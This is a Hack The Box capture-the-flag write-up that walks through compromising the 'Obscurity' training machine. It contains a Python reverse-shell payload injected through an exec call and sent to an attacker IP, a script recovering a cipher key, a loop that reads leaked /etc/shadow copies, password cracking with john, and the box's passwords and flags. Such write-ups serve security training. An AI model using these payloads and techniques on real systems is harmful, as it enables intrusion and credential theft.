---
path: "/htb-obscurity"
title: "Hack The Box - Obscurity"
date: "04/17/2020"
featuredImage: ../../images/obscurity.png
tags: ["pentesting","hackthebox","linux"]
---

As with every box,  start off with an NMAP scan to see what we are dealing with. 
```
# Nmap 7.80 scan initiated Tue Apr 21 01:59:06 2020 as: nmap -v -sV -sC -oA nmap/safe -Pn 10.10.10.168
Nmap scan report for 10.10.10.168
Host is up (0.19s latency).
Not shown: 996 filtered ports
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA)
|   256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA)
|_  256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519)
80/tcp   closed http
8080/tcp open   http-proxy BadHTTPServer
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Tue, 21 Apr 2020 06:03:55
|     Server: BadHTTPServer
|     Last-Modified: Tue, 21 Apr 2020 06:03:55
|     Content-Length: 4171
|     Content-Type: text/html
|     Connection: Closed
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>0bscura</title>
|     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta name="keywords" content="">
|     <meta name="description" content="">
|     <!-- 
|     Easy Profile Template
|     http://www.templatemo.com/tm-467-easy-profile
|     <!-- stylesheet css -->
|     <link rel="stylesheet" href="css/bootstrap.min.css">
|     <link rel="stylesheet" href="css/font-awesome.min.css">
|     <link rel="stylesheet" href="css/templatemo-blue.css">
|     </head>
|     <body data-spy="scroll" data-target=".navbar-collapse">
|     <!-- preloader section -->
|     <!--
|     <div class="preloader">
|_    <div class="sk-spinner sk-spinner-wordpress">
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: BadHTTPServer
|_http-title: 0bscura
9000/tcp closed cslistener
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :

```

# Findings
From the result of the NMAP scan, port `8080` is the attack vector. Navigating to this site, there is a message on the page that eluded to the presence of a file name `SuperSecureServer.py`. This file does not exist at the root directory an hence [wfuzz](https://tools.kali.org/web-applications/wfuzz) is needed.

`wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt http://10.10.10.168:8080/FUZZ/SuperSecureServer.py`

The file is found to be located at `http://10.10.10.168:8080/develop/SuperSecureServer.py`. Line 139 of this file shows this script is vulnerable to Remote Code Execution. 
```
info = "output = 'Document: {}'" # Keep the output for later debug
exec(info.format(path)) # This is how you do string formatting, right?
```

The `path` variable is what we pass in the HTTP request. `exec` is a python method that executes dynamically created python programs. In our case if we pass a valid python script, it will be executed. *In order for this exploit to work there should be no space in the python script*. 
A python reverse shell can script can be procured from [HackTricks](https://book.hacktricks.xyz/shells/shells/linux#python).

# User
### Payload
`';s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.26",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

The request can now be crafted via burp to get a reverse shell. The resulting request is as follows
```
GET ';s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.15.26",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' HTTP/1.1
Host: 10.10.10.168:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```
Once a shell is established, the next step  is to enumerate and elevate to a user account. The Only user on this box is `robert`. We can view the contents of his directory but cannot view the `user.txt`. 

*Better Shell
`python3 -c "import pty;pty.spawn('/bin/bash')"`

A couple of files stand out, 
`check.txt`
```
www-data@obscure:/home/robert$ cat check.txt
cat check.txt
Encrypting this file with your key should result in out.txt, make sure your key is correct! 
```

`out.txt`
```
www-data@obscure:/home/robert$ cat out.txt
cat out.txt
Â¦ÃšÃˆÃªÃšÃžÃ˜Ã›ÃÃ	Ã—ÃÃŠÃŸ
ÃžÃŠÃšÃ‰Ã¦ÃŸÃÃ‹ÃšÃ›ÃšÃªÃ™Ã‰Ã«Ã©Ã‘Ã’ÃÃÃ
ÃªÃ†Ã¡Ã™ÃžÃ£Ã’Ã‘ÃÃ¡Ã™Â¦Ã•Ã¦Ã˜Ã£ÃŠÃŽÃÃŸÃšÃªÃ†ÃÃ¡Ã¤Ã¨	ÃŽÃÃšÃŽÃ«Ã‘Ã“Ã¤Ã¡Ã›ÃŒÃ—	vwww-data@obscure:/home/robert$ 
```
`passwordreminder.txt`
```
www-data@obscure:/home/robert$ cat passwordreminder.txt
cat passwordreminder.txt
Â´Ã‘ÃˆÃŒÃ‰Ã Ã™ÃÃ‘Ã©Â¯Â·Â¿k
```

`SuperSecureCrypt.py`
```
www-data@obscure:/home/robert$ cat SuperSecureCrypt.py
cat SuperSecureCrypt.py
import sys
import argparse

def encrypt(text, key):
    keylen = len(key)
    keyPos = 0
    encrypted = ""
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr + ord(keyChr)) % 255)
        encrypted += newChr
        keyPos += 1
        keyPos = keyPos % keylen
    return encrypted

def decrypt(text, key):
    keylen = len(key)
    keyPos = 0
    decrypted = ""
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr - ord(keyChr)) % 255)
        decrypted += newChr
        keyPos += 1
        keyPos = keyPos % keylen
    return decrypted

parser = argparse.ArgumentParser(description='Encrypt with 0bscura\'s encryption algorithm')

parser.add_argument('-i',
                    metavar='InFile',
                    type=str,
                    help='The file to read',
                    required=False)

parser.add_argument('-o',
                    metavar='OutFile',
                    type=str,
                    help='Where to output the encrypted/decrypted file',
                    required=False)

parser.add_argument('-k',
                    metavar='Key',
                    type=str,
                    help='Key to use',
                    required=False)

parser.add_argument('-d', action='store_true', help='Decrypt mode')

args = parser.parse_args()

banner = "################################\n"
banner+= "#           BEGINNING          #\n"
banner+= "#    SUPER SECURE ENCRYPTOR    #\n"
banner+= "################################\n"
banner += "  ############################\n"
banner += "  #        FILE MODE         #\n"
banner += "  ############################"
print(banner)
if args.o == None or args.k == None or args.i == None:
    print("Missing args")
else:
    if args.d:
        print("Opening file {0}...".format(args.i))
        with open(args.i, 'r', encoding='UTF-8') as f:
            data = f.read()

        print("Decrypting...")
        decrypted = decrypt(data, args.k)

        print("Writing to {0}...".format(args.o))
        with open(args.o, 'w', encoding='UTF-8') as f:
            f.write(decrypted)
    else:
        print("Opening file {0}...".format(args.i))
        with open(args.i, 'r', encoding='UTF-8') as f:
            data = f.read()

        print("Encrypting...")
        encrypted = encrypt(data, args.k)

        print("Writing to {0}...".format(args.o))
        with open(args.o, 'w', encoding='UTF-8') as f:
            f.write(encrypted)
```

By the looks of it, `check.txt` was encrypted using `SuperSecureCrypt.py` to yield `out.txt`. SuperSecureCrypt.py is an implementation of [Vigenère Cipher](https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher) . This being the case we can use the plain text, encrypted text pair to get the key used for encryption. The encryption process is as follows: `C = (M + K) mod 255` and decryption: `M = (C - K) mod 255`. Given that in this case we only have `M` and `C`, the key can be extracted as `K = (C - M) mod 255`

This can be scripted to extract the key.
```python
pt = open('check.txt').read()
et = open('out.txt').read()

e_pt = list(map(lambda x: ord(x), list(pt)))
e_et = list(map(lambda x: ord(x), list(et)))

key = "".join(list(map(lambda x: chr(x[0]-x[1]), zip(e_et,e_pt))))
print(key)
```
This will print `'alexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichalexandrovichal'`, hence the key is `alexandrovich`

This key will inturn be used to decrypt `passwordreminder` with `SuperSecureCrypt.py`

```
www-data@obscure:/home/robert$ python3 SuperSecureCrypt.py -d -i passwordreminder.txt -o /tmp/dcpt -k alexandrovich
r.txt -o /tmp/dcpt -k alexandrovichasswordreminder
################################
#           BEGINNING          #
#    SUPER SECURE ENCRYPTOR    #
################################
  ############################
  #        FILE MODE         #
  ############################
Opening file passwordreminder.txt...
Decrypting...
Writing to /tmp/dcpt...
www-data@obscure:/home/robert$ cat /tmp/dcpt
cat /tmp/dcpt
SecThruObsFTW
```
With this password at hand, we can now elevate to `robert`'s user account.
```
www-data@obscure:/home/robert$ su robert
su robert
Password: SecThruObsFTW

robert@obscure:~$ cat user.txt
cat user.txt
e4493782066b55fe2755708736ada2d7
```

# Root
First thing to check is what binaries `robert` has sudo access to execute 
```
robert@obscure:~$ sudo -l
sudo -l
Matching Defaults entries for robert on obscure:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User robert may run the following commands on obscure:
    (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
```
Next step is to inspect this python script for vulnerabilities. 
```
BetterSSH.py
	 1	import sys
  2	import random, string
  3	import os
  4	import time
  5	import crypt
  6	import traceback
  7	import subprocess
  8	
  9	path = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
 10	session = {"user": "", "authenticated": 0}
 11	try:
 12	    session['user'] = input("Enter username: ")
 13	    passW = input("Enter password: ")
 14	
 15	    with open('/etc/shadow', 'r') as f:
 16	        data = f.readlines()
 17	    data = [(p.split(":") if "$" in p else None) for p in data]
 18	    passwords = []
 19	    for x in data:
 20	        if not x == None:
 21	            passwords.append(x)
 22	
 23	    passwordFile = '\n'.join(['\n'.join(p) for p in passwords]) 
 24	    with open('/tmp/SSH/'+path, 'w') as f:
 25	        f.write(passwordFile)
 26	    time.sleep(.1)
 27	    salt = ""
 28	    realPass = ""
 29	    for p in passwords:
 30	        if p[0] == session['user']:
 31	            salt, realPass = p[1].split('$')[2:]
 32	            break
 33	
 34	    if salt == "":
 35	        print("Invalid user")
 36	        os.remove('/tmp/SSH/'+path)
 37	        sys.exit(0)
 38	    salt = '$6$'+salt+'$'
 39	    realPass = salt + realPass
 40	
 41	    hash = crypt.crypt(passW, salt)
 42	
 43	    if hash == realPass:
 44	        print("Authed!")
 45	        session['authenticated'] = 1
 46	    else:
 47	        print("Incorrect pass")
 48	        os.remove('/tmp/SSH/'+path)
 49	        sys.exit(0)
 50	    os.remove(os.path.join('/tmp/SSH/',path))
 51	except Exception as e:
 52	    traceback.print_exc()
 53	    sys.exit(0)
 54	
 55	if session['authenticated'] == 1:
 56	    while True:
 57	        command = input(session['user'] + "@Obscure$ ")
 58	        cmd = ['sudo', '-u',  session['user']]
 59	        cmd.extend(command.split(" "))
 60	        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 61	
 62	        o,e = proc.communicate()
 63	        print('Output: ' + o.decode('ascii'))
 64	        print('Error: '  + e.decode('ascii')) if len(e.decode('ascii')) > 0 else print('')
```
The contents of `etc/shadow` is read  and written to a random file in `tmp/SSH`. 
One approach it to have a process that grabs and display the content of this directory when `BetterSSH.py` is executed.
In `Terminal 1`
```
robert@obscure:~$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
Enter username: robert
robert
Enter password: SecThruObsFTW
SecThruObsFTW
Authed!
```
In `Terminal 2`
```
while [ 0 -lt 10 ]; do cat /tmp/SSH/*; sleep 0.2; done
root
$6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1
18226
0
99999
7
```

*if a file not found exeception occurs, create `tmp/SSH`*

We can now decrypt of the has of `root`'s password
```
john --wordlist=rockyou.txt pass.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
mercedes         (?)
1g 0:00:00:00 DONE (2020-04-21 01:38) 1.234g/s 632.0p/s 632.0c/s 632.0C/s angelo..letmein
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
Now time to pivot to the root account and grab the flag
```
robert@obscure:~$ su root
su root
Password: mercedes

root@obscure:/home/robert# cat /root/root.txt
cat /root/root.txt
512fd4429f33a113a44d5acde23609e3
root@obscure:/home/robert# 
```